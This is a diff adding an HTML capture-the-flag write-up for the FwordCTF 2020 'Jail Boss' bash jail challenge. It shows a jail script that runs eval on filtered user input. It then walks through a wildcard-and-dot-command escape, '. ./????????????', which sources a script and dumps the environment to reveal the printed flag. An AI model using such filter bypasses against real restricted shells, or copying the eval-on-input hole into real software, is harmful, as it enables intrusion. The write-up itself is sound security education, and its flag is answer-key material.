@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Jail boss</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav>
+            <ul class="nav-menu nav-center">
+            <li><a href="#">CTFs <i class="arrow down"></i></a>
+                <ul>
+                <li><a href="#">FwordCTF_2020 <i class="arrow right"></i></a>
+                    <ul>
+                    <li><a href="#">bash <i class="arrow right"></i></a>
+                        <ul>
+                        <li><a href="/ctfs/fword_ctf2020/bash/bash_is_fun.html">bash is fun</a></li>
+                        <li><a href="/ctfs/fword_ctf2020/bash/jail_boss.html">jail boss</a></li>
+                        </ul>
+                    </li>
+                    </ul>
+                </li>
+                </ul>
+            </li>
+            <!-- <li><a href="#">example</a></li> -->
+            </ul>
+        </nav>
+    </div>
+
+    <hr />
+    
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="JailBoss_0"></a>JailBoss</h1>
+<p class="has-line-data" data-line-start="1" data-line-end="2">You are provided with an SSH account to server <code>ssh -p 2222 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4e2d3a280e242f27222c213d3d602839213c2a60393a28">[email&#160;protected]</a></code>, and 2 files.</p>
+<h2 class="code-line" data-line-start=3 data-line-end=4><a id="taskFwordsh_3"></a><code>taskFword.sh</code></h2>
+<pre><code class="has-line-data" data-line-start="5" data-line-end="9" class="language-sh"><span class="hljs-shebang">#!/bin/bash</span>
+<span class="hljs-built_in">export</span> FLAG=<span class="hljs-string">"FwordCTF{REDACTED}"</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-string">"A useless script for a useless SysAdmin"</span>
+</code></pre>
+<h2 class="code-line" data-line-start=10 data-line-end=11><a id="jailsh_10"></a><code>jail.sh</code></h2>
+<pre><code class="has-line-data" data-line-start="12" data-line-end="45" class="language-sh"><span class="hljs-shebang">#!/bin/bash</span>
+figlet <span class="hljs-string">"BASH JAIL x Fword"</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-string">"Welcome! Kudos to Anis_Boss Senpai"</span>
+<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">a</span></span>(){
+/usr/bin/env
+}
+<span class="hljs-built_in">export</span> <span class="hljs-operator">-f</span> a
+<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">calculSlash</span></span>(){
+    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span>|grep -o <span class="hljs-string">"/"</span>|wc <span class="hljs-operator">-l</span>
+}
+<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">calculPoint</span></span>(){
+    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span>|grep -o <span class="hljs-string">"."</span>|wc <span class="hljs-operator">-l</span>
+}
+<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">calculA</span></span>(){
+        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span>|grep -o <span class="hljs-string">"a"</span>|wc <span class="hljs-operator">-l</span>
+}
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>;<span class="hljs-keyword">do</span>
+<span class="hljs-built_in">read</span> -p <span class="hljs-string">"&gt;&gt; "</span> input ;
+<span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$input</span>"</span>| grep -v -E <span class="hljs-string">"^(\.|\/| |\?|a)*$"</span> ;<span class="hljs-keyword">then</span>
+        <span class="hljs-built_in">echo</span> <span class="hljs-string">"No No not that easy "</span>
+<span class="hljs-keyword">else</span>
+    pts=$(calculPoint <span class="hljs-variable">$input</span>)
+    slash=$(calculSlash <span class="hljs-variable">$input</span>)
+    nbA=$(calculA <span class="hljs-variable">$input</span>)
+    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$pts</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">2</span> || <span class="hljs-variable">$slash</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">1</span> || <span class="hljs-variable">$nbA</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">1</span> ]];<span class="hljs-keyword">then</span>
+        <span class="hljs-built_in">echo</span> <span class="hljs-string">"That's Too much"</span>
+    <span class="hljs-keyword">else</span>
+        <span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-variable">$input</span>"</span>
+    <span class="hljs-keyword">fi</span>
+<span class="hljs-keyword">fi</span>
+<span class="hljs-keyword">done</span>
+</code></pre>
+<p class="has-line-data" data-line-start="46" data-line-end="47">When you connect to remote server you are greeted with</p>
+<pre><code class="has-line-data" data-line-start="49" data-line-end="76"> _____                       _ 
+|  ___|_      _____  _ __ __| |
+| |_  \ \ /\ / / _ \| '__/ _` |
+|  _|  \ V  V / (_) | | | (_| |
+|_|     \_/\_/ \___/|_|  \__,_|
+                               
+<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="accfd8caecc6cdc5c0cec3dfdf82cadbc3dec882dbd8ca">[email&#160;protected]</a>'s password: 
+
+DISCLAIMER: Please don't abuse the server or you will get banned !
+
+Author: Kahla, Contact me for any problems; GL &amp; HF
+
+ ____    _    ____  _   _       _   _    ___ _            
+| __ )  / \  / ___|| | | |     | | / \  |_ _| |     __  __
+|  _ \ / _ \ \___ \| |_| |  _  | |/ _ \  | || |     \ \/ /
+| |_) / ___ \ ___) |  _  | | |_| / ___ \ | || |___   &gt;  &lt; 
+|____/_/   \_\____/|_| |_|  \___/_/   \_\___|_____| /_/\_\
+                                                          
+ _____                       _ 
+|  ___|_      _____  _ __ __| |
+| |_  \ \ /\ / / _ \| '__/ _` |
+|  _|  \ V  V / (_) | | | (_| |
+|_|     \_/\_/ \___/|_|  \__,_|
+                               
+Welcome! Kudos to Anis_Boss Senpai
+&gt;&gt; 
+</code></pre>
+<p class="has-line-data" data-line-start="77" data-line-end="79">And you can input commands.<br>
+We can assume that <code>jail.sh</code> is ran after connecting to server and that <code>taskFword.sh</code> is probably in the same directory.</p>
+<h2 class="code-line" data-line-start=80 data-line-end=81><a id="Method_80"></a>Method</h2>
+<ol>
+<li class="has-line-data" data-line-start="81" data-line-end="82">Find a way to execute <code>taskFword.sh</code> to load flag to ENV</li>
+<li class="has-line-data" data-line-start="82" data-line-end="84">Call a() to execute /usr/bin/env (where already loaded flag resides)</li>
+</ol>
+<h2 class="code-line" data-line-start=84 data-line-end=85><a id="The_script_84"></a>The script</h2>
+<p class="has-line-data" data-line-start="85" data-line-end="86">We can see that the script asks for input.</p>
+<pre><code class="has-line-data" data-line-start="87" data-line-end="89" class="language-sh"><span class="hljs-built_in">read</span> -p <span class="hljs-string">"&gt;&gt; "</span> input ;
+</code></pre>
+<p class="has-line-data" data-line-start="90" data-line-end="92">Then script checks if out input consists only of certain characters <code>.</code> <code>/</code> <code>:space:</code> <code>?</code> <code>a</code><br>
+Those are only allowed characters.</p>
+<pre><code class="has-line-data" data-line-start="93" data-line-end="95" class="language-sh"><span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$input</span>"</span>| grep -v -E <span class="hljs-string">"^(\.|\/| |\?|a)*$"</span> ;<span class="hljs-keyword">then</span>
+</code></pre>
+<p class="has-line-data" data-line-start="96" data-line-end="97">Then we use defined functions</p>
+<pre><code class="has-line-data" data-line-start="98" data-line-end="108" class="language-sh"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">calculSlash</span></span>(){
+    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span>|grep -o <span class="hljs-string">"/"</span>|wc <span class="hljs-operator">-l</span>
+}
+<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">calculPoint</span></span>(){
+    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span>|grep -o <span class="hljs-string">"."</span>|wc <span class="hljs-operator">-l</span>
+}
+<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">calculA</span></span>(){
+    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span>|grep -o <span class="hljs-string">"a"</span>|wc <span class="hljs-operator">-l</span>
+}
+</code></pre>
+<p class="has-line-data" data-line-start="109" data-line-end="111">to find out number of appereances of characters <code>/</code> <code>.</code> <code>a</code><br>
+Notice how the script is not checking counts of <code>:space:</code> or <code>?</code></p>
+<pre><code class="has-line-data" data-line-start="112" data-line-end="116" class="language-sh">pts=$(calculPoint <span class="hljs-variable">$input</span>)
+slash=$(calculSlash <span class="hljs-variable">$input</span>)
+nbA=$(calculA <span class="hljs-variable">$input</span>)
+</code></pre>
+<p class="has-line-data" data-line-start="117" data-line-end="119">Then we check number of appereances.<br>
+We can you maximum of 2x<code>.</code>, 1x<code>/</code> and 1x<code>a</code></p>
+<pre><code class="has-line-data" data-line-start="120" data-line-end="122" class="language-sh"><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$pts</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">2</span> || <span class="hljs-variable">$slash</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">1</span> || <span class="hljs-variable">$nbA</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">1</span> ]];<span class="hljs-keyword">then</span>
+</code></pre>
+<p class="has-line-data" data-line-start="123" data-line-end="126">If the condition is satisfied, script calls <code>eval</code> with our input.<br>
+This is a dangerous builtin command that shouldn’t be used with user input.<br>
+We can potentionaly run “any” command we want with this</p>
+<pre><code class="has-line-data" data-line-start="127" data-line-end="129" class="language-sh"><span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-variable">$input</span>"</span>
+</code></pre>
+<h2 class="code-line" data-line-start=130 data-line-end=131><a id="Exploit_130"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="131" data-line-end="135">How can we execute a command only with these characters <code>.</code> <code>/</code> <code>:space:</code> <code>?</code> <code>a</code><br>
+We can’t do <code>./taskFword.sh</code> because there are banned characters.<br>
+What we can do is use regex symbol <code>?</code> which is a substitute for a single character.<br>
+If you don’t understand regex read about it. (You have probably used commands like <code>rm *</code>, <code>*</code> is a regex symbol meaning ‘everything’).</p>
+<p class="has-line-data" data-line-start="136" data-line-end="140">So we can try:<br>
+<code>./????????????</code><br>
+which can resolve to<br>
+<code>./taskFword.sh</code></p>
+<p class="has-line-data" data-line-start="141" data-line-end="143">Here is a catch.<br>
+When scripts evaluates function</p>
+<pre><code class="has-line-data" data-line-start="144" data-line-end="148" class="language-sh"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">calculPoint</span></span>(){
+    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span>|grep -o <span class="hljs-string">"."</span>|wc <span class="hljs-operator">-l</span>
+}
+</code></pre>
+<p class="has-line-data" data-line-start="148" data-line-end="150">with our input <code>./????????????</code> it checks for occurence of <code>.</code> which in regex means ‘any character’. So the function ‘returns’ count <code>14</code> since we used 14 characters as our input, which stops us from evaluating our input since we are allowed to use 2 <strong>dots</strong> (<code>.</code>).<br>
+How can we solve this?</p>
+<p class="has-line-data" data-line-start="151" data-line-end="152">The solution is in</p>
+<pre><code class="has-line-data" data-line-start="153" data-line-end="155" class="language-sh">pts=$(calculPoint <span class="hljs-variable">$input</span>)
+</code></pre>
+<p class="has-line-data" data-line-start="155" data-line-end="156">and respective</p>
+<pre><code class="has-line-data" data-line-start="157" data-line-end="161" class="language-sh"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">calculPoint</span></span>(){
+    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span>|grep -o <span class="hljs-string">"."</span>|wc <span class="hljs-operator">-l</span>
+}
+</code></pre>
+<p class="has-line-data" data-line-start="162" data-line-end="163">The function only evaluates the first argument <code>$1</code> from our input (which was our entire input string so far). But we can use <code>:space:</code> to divide our input into 2 words. First word can be <code>.</code> which evaluates to count <code>1</code> since we only used 1 character and second word can be our payload <code>./????????????</code>.</p>
+<p class="has-line-data" data-line-start="164" data-line-end="166">Together<br>
+<code>. ./????????????</code></p>
+<p class="has-line-data" data-line-start="167" data-line-end="168">This input successfuly satisfies all conditions. And bash interpreter evaluates first <code>.</code> as <strong>dot command</strong> (command that evaluates commands in the current execution context) and then executes the scripts that loads the FLAG into our ENVIROMENT.</p>
+<h2 class="code-line" data-line-start=169 data-line-end=170><a id="In_action_169"></a>In action</h2>
+<pre><code class="has-line-data" data-line-start="171" data-line-end="174">&gt;&gt; . ./????????????
+A useless script for a useless SysAdmin
+</code></pre>
+<p class="has-line-data" data-line-start="175" data-line-end="176">Then we can simply invoke function a() to print our ENVIROMENT</p>
+<pre><code class="has-line-data" data-line-start="177" data-line-end="194">&gt;&gt; a
+SHELL=/opt/jail.sh
+PWD=/home/ctf
+LOGNAME=ctf
+MOTD_SHOWN=pam
+HOME=/home/ctf/
+LANG=en_US.UTF-8
+FLAG=FwordCTF{BasH_1S_R3aLLy_4w3s0m3_K4hLaFTW}
+TERM=xterm-256color
+USER=ctf
+SHLVL=1
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+SSH_TTY=/dev/pts/2
+BASH_FUNC_a%%=() {  /usr/bin/env
+}
+_=/usr/bin/env
+</code></pre>
+<h2 class="code-line" data-line-start=195 data-line-end=196><a id="The_Flag_195"></a>The Flag</h2>
+<p class="has-line-data" data-line-start="196" data-line-end="197"><strong>FwordCTF{BasH_1S_R3aLLy_4w3s0m3_K4hLaFTW}</strong></p>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+</body>
+
+</html>
